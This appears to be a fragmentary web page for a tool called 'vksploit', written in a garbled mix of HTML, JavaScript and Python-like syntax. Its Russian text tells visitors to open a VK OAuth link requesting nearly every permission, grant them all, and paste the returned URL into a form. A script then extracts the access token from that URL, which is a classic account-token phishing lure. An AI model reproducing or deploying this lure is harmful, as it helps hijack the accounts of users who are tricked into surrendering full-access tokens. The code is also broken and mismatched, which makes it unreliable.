%*
<body>
<div id="main">
enable javascript support
</div>
<script>
*%
def show(q,e):
 document.getElementById(e).textContent=q
#######################
token=localStorage['t']
if token==null:
 show('''Станьте больше, чем просто пользователь с использованием vksploit
откройте <a target="_blank" href="https://oauth.vk.com/authorize?client_id=2685278&scope=1073737727&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1">страницу регистрации<a/>
предоставьме все разрешения
скопируйте url в поле ниже
<form onsumbit="reg_token_h()">
<input id="reg_token" type="text">
</form>
<div id="debug"></div>
''',"main")
def reg_token_h():
 alert('jell')
 token=reg_token_h.value
 show(token,"debug")
 /*'''
 acc=token.indexOf('access_token=')
 if acc>-1:
  oth=token.indexOf('&',acc)
  token=token.slice(acc+13,oth)
  alert(token)
reg_token.onclick=reg_token_h()
 '''*/return false
%*</script>
</body>*%
